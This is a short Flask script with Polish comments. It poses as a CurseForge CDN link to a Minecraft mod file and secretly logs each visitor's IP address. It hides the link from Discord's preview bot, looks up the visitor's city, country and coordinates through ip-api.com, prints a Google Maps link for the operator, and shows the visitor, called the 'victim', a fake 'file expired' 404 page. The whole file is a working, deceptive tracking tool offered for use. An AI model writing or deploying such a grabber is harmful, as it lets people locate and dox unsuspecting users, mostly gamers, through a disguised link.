from flask import Flask, request, abort
import requests
import sys

app = Flask(__name__)

# Nowa ścieżka udająca serwer plików (CDN)
@app.route('/cdn-curseforge-files/minecraft/mc-mods/v7401617')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Blokowanie bota Discorda (żeby nie było podglądu Imgur/Error)
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return abort(404)

    # LOGOWANIE DO KONSOLI
    print(f"\n[!!!] KLIKNIĘCIE [!!!]", flush=True)
    print(f"IP: {ip}", flush=True)
    
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country", timeout=5).json()
        if r.get("status") == "success":
            lat, lon = r.get('lat'), r.get('lon')
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}", flush=True)
            # GOTOWY LINK DO MAPY DLA CIEBIE
            print(f"MAPA: https://www.google.com/maps?q={lat},{lon}", flush=True)
    except: pass
    sys.stdout.flush()

    # Ofiara widzi czysty błąd 404 (wygląda jak wygasły link do pliku)
    return '<h1>404 Not Found</h1><p>The requested file has expired or is no longer available on this CDN node.</p>', 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
